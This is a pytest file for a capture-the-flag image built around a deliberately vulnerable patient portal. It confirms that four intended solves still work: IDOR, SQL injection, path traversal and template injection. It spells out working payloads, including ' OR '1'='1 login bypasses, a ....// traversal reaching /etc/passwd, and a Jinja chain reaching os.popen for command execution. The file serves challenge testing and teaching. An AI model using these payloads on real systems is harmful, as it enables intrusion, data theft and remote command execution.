"""The four intended solutions, each end to end (spec 045).

The point of testing a challenge image is not that the code works — it is that
**the intended solution still works**. A regression that quietly makes a
challenge unsolvable should fail a build, not an event.

Each test solves one challenge the way the published hints describe, and asserts
it got that challenge's flag and not a sibling's.
"""

from __future__ import annotations

import json
import os

import pytest

from tests.conftest import MINTED, READ_COMMAND, traverse

posix_only = pytest.mark.skipif(
    os.name == "nt", reason="the container is Linux; /etc/passwd is not a Windows path"
)


class TestSomeoneElsesChart:
    """easy — IDOR. Change the identifier, read somebody else's chart."""

    def test_incrementing_the_id_reaches_another_patients_record(self, signed_in) -> None:
        own = signed_in.get("/record?id=1042")
        assert b"Priya Abernathy" in own.data

        theirs = signed_in.get("/record?id=1043")

        assert theirs.status_code == 200
        assert b"Theodore Wainfleet" in theirs.data
        assert MINTED["someone-elses-chart"].encode() in theirs.data

    def test_the_neighbours_are_seeded_so_browsing_works(self, signed_in) -> None:
        """Incrementing or decrementing must land on a record, not a 404 wall."""
        for record_id in range(1035, 1051):
            assert signed_in.get(f"/record?id={record_id}").status_code == 200


class TestQuotesAreLoadBearing:
    """medium — SQL injection. Confirm with a quote, then bypass the login."""

    def test_a_single_apostrophe_surfaces_the_error(self, client) -> None:
        response = client.post("/login", data={"username": "'", "password": "x"})

        assert response.status_code == 200
        assert b"Database error" in response.data

    def test_the_classic_payload_logs_in_as_the_administrator(self, client) -> None:
        """`' OR '1'='1` in the username field, exactly as the hint says."""
        response = client.post(
            "/login",
            data={"username": "' OR '1'='1", "password": "anything"},
            follow_redirects=True,
        )

        assert response.status_code == 200
        assert b"Administration" in response.data
        assert MINTED["quotes-are-load-bearing"].encode() in response.data

    def test_the_commented_variant_works_too(self, client) -> None:
        response = client.post(
            "/login",
            data={"username": "' OR 1=1 -- ", "password": ""},
            follow_redirects=True,
        )

        assert MINTED["quotes-are-load-bearing"].encode() in response.data

    def test_the_password_field_alone_is_not_the_way_in(self, client) -> None:
        """A consequence of the clause order, recorded so it is not a surprise.

        `password` comes first in the query, which is what makes the published
        hint's `' OR '1'='1` work in the *username* field. The mirror image does
        not work: AND binds tighter than OR, so a true test on the password side
        is still ANDed against a username that does not exist.
        """
        response = client.post(
            "/login",
            data={"username": "nobody", "password": "' OR '1'='1"},
            follow_redirects=True,
        )

        assert MINTED["quotes-are-load-bearing"].encode() not in response.data

    def test_an_honest_patient_login_does_not_reach_the_dashboard(self, signed_in) -> None:
        response = signed_in.get("/admin")

        assert response.status_code == 403
        assert MINTED["quotes-are-load-bearing"].encode() not in response.data


class TestUpAndOut:
    """hard — path traversal. `....//` survives the single-pass filter."""

    def test_the_double_dot_slash_alone_is_stripped(self, signed_in) -> None:
        """The filter has to actually work, or the challenge has no difficulty."""
        response = signed_in.get("/page?f=../../../etc/passwd")

        assert response.status_code == 404

    @posix_only
    def test_nested_traversal_reaches_etc_passwd(self, signed_in) -> None:
        """The confirmation step the second hint describes."""
        response = signed_in.get("/page?f=....//....//....//etc/passwd")

        assert response.status_code == 200
        assert b"root:" in response.data

    def test_nested_traversal_reaches_the_flag(self, signed_in, portal) -> None:
        import flags

        response = signed_in.get(f"/page?f={traverse(flags.TRAVERSAL_FLAG_PATH)}")

        assert response.status_code == 200
        assert MINTED["up-and-out"].encode() in response.data

    def test_the_ordinary_pages_still_render(self, signed_in) -> None:
        response = signed_in.get("/page?f=welcome.html")

        assert response.status_code == 200
        assert b"Surgery hours" in response.data


class TestCurlyBraces:
    """very hard — server-side template injection, to command execution."""

    def test_arithmetic_in_the_delimiters_is_evaluated(self, signed_in) -> None:
        response = signed_in.post("/message", data={"recipient": "1042", "body": "{{7*7}}"})

        assert response.status_code == 200
        assert b"49" in response.data

    def test_the_object_graph_reaches_command_execution(self, signed_in, portal) -> None:
        """The intended solve: walk a template global to popen, read the file."""
        import flags

        # Backslashes are escape sequences inside a Jinja string literal, so a
        # Windows path has to be doubled. A no-op on Linux, where the container
        # and CI actually run.
        path = flags.SSTI_FLAG_PATH.replace("\\", "\\\\")
        payload = f"{{{{ cycler.__init__.__globals__.os.popen('{READ_COMMAND} {path}').read() }}}}"

        response = signed_in.post("/message", data={"recipient": "1042", "body": payload})

        assert response.status_code == 200
        assert MINTED["curly-braces"].encode() in response.data

    def test_a_broken_payload_gets_an_error_not_a_traceback(self, signed_in) -> None:
        response = signed_in.post("/message", data={"recipient": "1042", "body": "{{ 1/0 }}"})

        assert response.status_code == 200
        assert b"could not be composed" in response.data
        assert b"Traceback" not in response.data


class TestTheFourAreDistinct:
    def test_no_solve_hands_over_a_siblings_flag(self, signed_in, client) -> None:
        """Each route returns its own flag and nobody else's.

        The one exception is deliberate and accepted: the template injection
        reaches everything, because it is command execution. It is the hardest
        of the four, so the leak runs downward.
        """
        import flags

        idor = signed_in.get("/record?id=1043").data
        traversal = signed_in.get(f"/page?f={traverse(flags.TRAVERSAL_FLAG_PATH)}").data

        for slug, body in (("someone-elses-chart", idor), ("up-and-out", traversal)):
            for other, value in MINTED.items():
                if other != slug:
                    assert value.encode() not in body, f"{slug} leaked {other}"


class TestWithoutThePlatform:
    """The image has to run, and be solvable, with no INSTANCE_ANSWERS."""

    def test_it_falls_back_to_local_flags(self, portal_without_platform) -> None:
        app, flags_module = portal_without_platform

        with app.test_client() as client:
            client.post("/login", data={"username": "p.abernathy", "password": "springfield"})
            response = client.get("/record?id=1043")

        assert response.status_code == 200
        assert flags_module.LOCAL_FALLBACK["someone-elses-chart"].encode() in response.data

    def test_a_malformed_answers_variable_does_not_stop_the_container(self, tmp_path) -> None:
        from tests.conftest import _boot

        app_module, flags_module = _boot(tmp_path, "{not json")

        with app_module.app.test_client() as client:
            assert client.get("/healthz").status_code == 200

    def test_one_missing_key_does_not_take_the_others_down(self, tmp_path) -> None:
        from tests.conftest import _boot

        partial = {k: v for k, v in MINTED.items() if k != "up-and-out"}
        app_module, flags_module = _boot(tmp_path, json.dumps(partial))

        with app_module.app.test_client() as client:
            client.post("/login", data={"username": "p.abernathy", "password": "springfield"})
            response = client.get("/record?id=1043")

        assert MINTED["someone-elses-chart"].encode() in response.data
